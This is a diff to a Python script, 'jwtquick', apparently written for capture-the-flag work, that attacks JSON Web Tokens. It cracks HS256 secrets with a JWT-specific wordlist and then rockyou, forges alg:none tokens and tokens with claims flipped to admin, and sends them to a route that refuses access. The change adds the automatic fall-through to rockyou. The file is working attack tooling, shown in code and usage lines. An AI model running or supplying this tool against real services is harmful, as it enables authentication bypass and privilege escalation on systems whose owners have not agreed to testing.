@@ -1,16 +1,23 @@
 #!/usr/bin/env python3
-"""jwtquick — the whole cheap JWT attack surface in one foreground call (~1s).
+"""jwtquick — the whole cheap JWT attack surface in one foreground call.
 
-Decodes the token, dictionary-cracks the HS256 secret against a JWT-specific wordlist,
-mints alg:none and privilege-escalated variants, fires every candidate at a route that
-currently refuses you, and scans status + headers + body for a flag.
+Decodes the token, dictionary-cracks the HS256 secret, mints alg:none and
+privilege-escalated variants, fires every candidate at a route that currently refuses
+you, and scans status + headers + body for a flag.
 
     python jwtquick.py --token "$TOKEN" --base https://target --test /api/admin/stats
 
 Only --token is required; without --base it just cracks and prints candidate tokens.
-The default wordlist is 104k scraped JWT secrets and scans in ~0.8s, so this belongs in
-the foreground at step 3. Escalate to rockyou (~39s, worth backgrounding) only if this
-misses and JWT is still a live hypothesis:
+Cracking is a two-stage chain by default: the 104k-entry JWT-specific list first
+(~1s — catches framework/tutorial defaults rockyou won't have), then rockyou
+automatically on a miss (~30-40s — catches plain common words; the entry point for
+common words IS common words, and CTF authors reach for them constantly). Worst case
+is one rockyou scan either way, same as calling it alone; typical case is much faster.
+Still belongs in the foreground — this stays a single blocking call either way, just
+sometimes a ~40s one instead of ~1s.
+
+--wordlist pins a single list and skips the chain entirely, for when you already know
+which one you want:
 
     python jwtquick.py --token "$T" --base URL --test /admin --wordlist /c/Tools/hashcat-6.2.6/hashcat-6.2.6/rockyou.txt
 """
@@ -22,6 +29,10 @@ SECLISTS = os.environ.get("SECLISTS", "C:/Tools/SecLists").replace("\\", "/")
 if SECLISTS.startswith("/c/"):                      # tolerate a Git-Bash-style SECLISTS
     SECLISTS = "C:/" + SECLISTS[3:]
 DEFAULT_WL = SECLISTS.rstrip("/") + "/Passwords/scraped-JWT-secrets.txt"
+# Same /c/... tolerance as SECLISTS above — read by Python, not Git Bash.
+ROCKYOU = os.environ.get("ROCKYOU", "C:/Tools/hashcat-6.2.6/hashcat-6.2.6/rockyou.txt").replace("\\", "/")
+if ROCKYOU.startswith("/c/"):
+    ROCKYOU = "C:/" + ROCKYOU[3:]
 # claims worth flipping, and what to flip them to
 PRIV = {"role": "admin", "roles": ["admin"], "isAdmin": True, "is_admin": True,
         "admin": True, "user_type": "admin", "userType": "admin", "scope": "admin",
@@ -110,7 +121,8 @@ def main():
     ap.add_argument("--token", required=True)
     ap.add_argument("--base", help="target base URL; omit to only mint tokens")
     ap.add_argument("--test", default="/", help="path that currently refuses you (403/401)")
-    ap.add_argument("--wordlist", default=DEFAULT_WL)
+    ap.add_argument("--wordlist", help="crack against exactly this list only, "
+                     "skipping the default two-stage chain (JWT-specific, then rockyou)")
     ap.add_argument("--no-crack", action="store_true")
     a = ap.parse_args()
 
@@ -121,7 +133,19 @@ def main():
     print(f"[*] header  {json.dumps(hdr)}")
     print(f"[*] payload {json.dumps(pay)}")
 
-    secret = None if a.no_crack else crack(parts[0], parts[1], parts[2], a.wordlist)
+    if a.no_crack:
+        secret = None
+    elif a.wordlist:
+        secret = crack(parts[0], parts[1], parts[2], a.wordlist)
+    else:
+        # JWT-specific list first (~1s): catches framework/tutorial defaults rockyou
+        # won't have. Auto-escalate to rockyou only on a miss — same worst case as
+        # calling rockyou alone, much better typical case when the secret is a
+        # common word ('pumpkin' was candidate 547 of 14M, 0.00s).
+        secret = crack(parts[0], parts[1], parts[2], DEFAULT_WL)
+        if not secret:
+            print("[*] no hit in JWT-specific list, escalating to rockyou...")
+            secret = crack(parts[0], parts[1], parts[2], ROCKYOU)
 
     cands = []
     # alg:none family — free, works regardless of the secret
